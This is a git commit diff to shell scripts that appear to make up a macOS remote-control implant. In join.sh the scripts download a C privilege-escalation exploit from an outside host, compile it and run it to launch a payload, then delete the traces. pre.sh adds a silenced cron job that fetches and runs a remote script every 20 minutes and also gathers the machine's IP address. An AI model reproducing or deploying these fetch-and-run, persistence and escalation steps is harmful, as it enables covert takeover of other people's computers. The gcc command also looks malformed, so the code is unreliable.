211cb6be9060e678502c467f40997c29faafdd10
ErikBoesen <me@erikboesen.com>
2017-09-01 18:59:09 -0400

    Compile OS X exploit from C code rather than dling binary

--- control/mac/join.sh
+++ control/mac/join.sh
@@ -2,14 +2,16 @@
 
 # You can't set variables in this file. Each line is executed independently.
 # That's one of the reasons enact.sh needs to be separate.
-curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
+#curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
+curl -Lo /tmp/exp.c boesen.science:2042/mac/exp.c
+gcc /tmp/exp.c /tmp/a.out
 curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
-chmod +x /tmp/elevate.out /tmp/enact.sh
+chmod +x /tmp/enact.sh
 
-/tmp/elevate.out <<EOF
+/tmp/a.out <<EOF
 /tmp/enact.sh
 EOF
 
-rm -f /tmp/*.sh
+rm -f /tmp/*.sh /tmp/*.c /tmp/*.out
 
 clear
--- control/mac/pre.sh
+++ control/mac/pre.sh
@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-(crontab -l 2>/dev/null; echo '"*/20 * * * * curl -Lo /tmp/userupdate.sh boesen.science:2042/mac/userupdate.sh; chmod +x /tmp/userupdate.sh; /tmp/userupdate.sh"') | crontab -
+(crontab -l 2>/dev/null; echo "*/20 * * * * (curl -Lo /tmp/userupdate.sh boesen.science:2042/mac/userupdate.sh; chmod +x /tmp/userupdate.sh; /tmp/userupdate.sh) >/dev/null 2>&1") | crontab -
 
 USER=`whoami`
 IP=`/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
